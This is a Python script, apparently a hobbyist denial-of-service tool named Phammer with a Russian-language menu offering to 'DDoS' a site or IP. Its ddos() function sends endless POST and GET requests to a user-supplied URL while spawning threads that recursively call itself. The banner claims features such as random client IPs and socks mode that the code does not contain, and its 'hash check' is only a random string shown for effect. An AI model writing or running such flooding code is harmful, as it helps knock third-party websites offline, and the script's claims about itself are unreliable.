from colorama import Fore, Back, Style
from datetime import datetime
from threading import Thread
import sys
import requests
import os
import time
import socket
import random
import progressbar


#Вывод poket
print(Fore.YELLOW + '''
////////   //////////   //     //   ////////   //////////
//    //   //      //   //   //     //             //
//    //   //      //   // //       //             //
////////   //      //   ///         ////////       //
//         //      //   // //       //             //
//         //      //   //   //     //             //
//         //////////   //    //    ////////       // 
>--------------------------------------------->
Phammer создан в Python3.7
                            Create by Poketoff
┌─────────────────────────────────────────────┐
│   Tos:  Не используйте для ддоса дневников  │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          + Fast Port Re-use                 │
│          + Added Random client ip           │
│          + Added socks mode selection       │
│          + Fixed slow mode                  │
├─────────────────────────────────────────────┤
│ Link: https://github.com/poketoff/phammer   │
└─────────────────────────────────────────────┘''')

print(Style.RESET_ALL)

#функция инициализации
def initialization():
	bar = progressbar.ProgressBar(maxval=5.0).start()
	t = 0.0
	while t <= 1.0:
		bar.update(t)
		time.sleep(0.005)
		t += 0.01
	bar.finish()


#функция инициализации хеша
def initialization_hash():
	bar = progressbar.ProgressBar(maxval=10.0).start()
	t = 0.0
	while t <= 1.0:
		bar.update(t)
		time.sleep(0.002)
		t += 0.01
	bar.finish()

#функция проверки хеша
def hash_check():
	chars = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
	number = 1
	length = 12
	for n in range(number):
		password =''
		for i in range(length):
			password += random.choice(chars)
		print("Твой hash=> " + password)
#функция ddos
def ddos():
	url = input("URL-адрес: ")
	thrnom = input("Ресурс: ")
	while(1<10):
		spam = requests.post(url)
		spam2 = requests.get(url)
		for i in range(int(thrnom)):
			thr = Thread(target = ddos)
			thr.start()
			print(Fore.RED + "DDoS ИДЕТ")




initialization()
print(Fore.GREEN + "Инициализация успешна")
print(Style.RESET_ALL)

time.sleep(2)
print("Проверка hash`а")
initialization_hash()

hash_check()

print(Fore.GREEN + "Вывожу меню")

#функция вывода меню
def show_main_menu():
	print(Style.RESET_ALL)
	print("[0]Exit")
	print("[1]DDoS-Site")
	print("[2]DDoS-ip")
	print("[3]Check Port")
show_main_menu()

choice = input(Fore.RED + "> ")

if choice == "0":
	exit("ТВОЙ IP УЖЕ У ФСБ :3")

elif choice == "1":
	ddos()
